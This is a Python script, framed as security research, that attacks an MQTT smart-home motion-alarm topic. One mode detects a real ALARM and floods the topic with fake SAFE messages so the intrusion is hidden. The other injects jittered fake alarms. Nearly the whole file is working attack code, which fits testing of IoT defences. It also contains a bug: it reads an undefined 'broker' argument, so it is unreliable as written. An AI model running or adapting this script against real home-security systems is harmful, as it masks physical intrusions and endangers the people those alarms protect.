import paho.mqtt.client as mqtt
import json
import time
import argparse
import random
import threading
import sys
import os

# Ensure the project root is in the path for forensic_utils
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from forensic_utils import DualLogger, get_timestamp, get_iso_now

# Standardized Research Banners
BANNER = """
==================================================
  SOVEREIGNTY RESEARCH: ADVERSARIAL SPOOF ENGINE
==================================================
"""

# Target Environment Configuration
BROKER = os.getenv("MQTT_BROKER", "localhost")
PORT = 1883
TARGET_TOPIC = "shtsp/home/security/motion"

# Configuration for standardized logging
PROJECT_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
BASE_DIR = os.path.join(PROJECT_ROOT, "dataset")
LOG_DIR = os.path.join(BASE_DIR, "logs")
SESSIONS_DIR = os.path.join(BASE_DIR, "sessions")

class IntelligentMirror:
    def __init__(self, mode, masking_burst, broker=BROKER):
        self.mode = mode
        self.masking_burst = masking_burst
        self.broker = broker
        self.client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION1, "Research_Mirror")
        self.client.on_connect = self.on_connect
        self.client.on_message = self.on_message
        
        self.last_seq = 0
        self.is_masking = False
        self.total_injected = 0

    def on_connect(self, client, userdata, flags, rc):
        print(f"✅ Intelligence Mirror connected to {self.broker}")
        client.subscribe(TARGET_TOPIC)
        print(f"👀 Monitoring {TARGET_TOPIC} for context-aware injection...")

    def on_message(self, client, userdata, msg):
        try:
            data = json.loads(msg.payload.decode())
            self.last_seq = data.get("seq", self.last_seq)
            
            if self.mode == "masking" and data.get("status") == "ALARM" and not self.is_masking:
                print(f"\n[!] REAL ALARM IDENTIFIED (Seq: {self.last_seq}). Initiating CONTEXT-AWARE MASKING...")
                threading.Thread(target=self.perform_masking).start()
        except:
            pass

    def perform_masking(self):
        self.is_masking = True
        for i in range(self.masking_burst):
            spoofed_seq = self.last_seq + i + 1
            payload = {
                "seq": spoofed_seq,
                "type": "MOTION",
                "status": "SAFE",
                "uptime": random.randint(100000, 500000),
                "intelligent_masking": True
            }
            self.client.publish(TARGET_TOPIC, json.dumps(payload))
            self.total_injected += 1
            sys.stdout.write(f"\r🛡️  Masking in progress: {i+1}/{self.masking_burst} packets sent")
            sys.stdout.flush()
        
        print("\n🏁 Context-Aware Masking Completed. Real intrusion event should be hidden in the flood.")
        self.is_masking = False

    def start_spoof_loop(self, interval):
        print(f"🚀 Starting ADVERSARIAL SPOOF sequence (Base Interval: {interval}s)...")
        try:
            while True:
                self.last_seq += 1
                jitter = random.gauss(0, 0.2) 
                wait_time = max(0.1, interval + jitter)
                
                payload = {
                    "seq": self.last_seq,
                    "type": "MOTION",
                    "status": "ALARM",
                    "uptime": random.randint(100000, 500000),
                    "adversarial": True
                }
                self.client.publish(TARGET_TOPIC, json.dumps(payload))
                self.total_injected += 1
                print(f"[!] Injected Jittered Alert (Seq: {self.last_seq}) | Wait: {wait_time:.2f}s")
                time.sleep(wait_time)
        except KeyboardInterrupt:
            self.save_session()

    def save_session(self):
        session_ts = get_timestamp()
        
        # Dual Log Session Report
        session_data = {
            "timestamp": session_ts,
            "attack_type": "Adversarial_Spoofing",
            "mode": self.mode,
            "total_injected": self.total_injected
        }
        json_p, csv_p = DualLogger.log_session(session_data, SESSIONS_DIR, f"spoof_session_{session_ts}")
        print(f"\n📊 Forensic Trace Recorded: {json_p} (+.csv)")

    def run(self, interval):
        try:
            self.client.connect(self.broker, PORT, 60)
            if self.mode == "masking":
                self.client.loop_forever()
            else:
                self.client.loop_start()
                self.start_spoof_loop(interval)
        except KeyboardInterrupt:
            self.save_session()
            print("\n🛑 Simulation Stopped.")
        except Exception as e:
            print(f"❌ Error: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Advanced Adversarial Spoofing Analysis Tool")
    parser.add_argument("--mode", choices=["masking", "spoof"], default="masking", help="masking or spoof mode")
    parser.add_argument("--burst", type=int, default=50, help="Masking burst threshold")
    parser.add_argument("--interval", type=float, default=5.0, help="Spoof interval base")
    args = parser.parse_args()
    mirror = IntelligentMirror(args.mode, args.burst, broker=args.broker)
    mirror.run(args.interval)
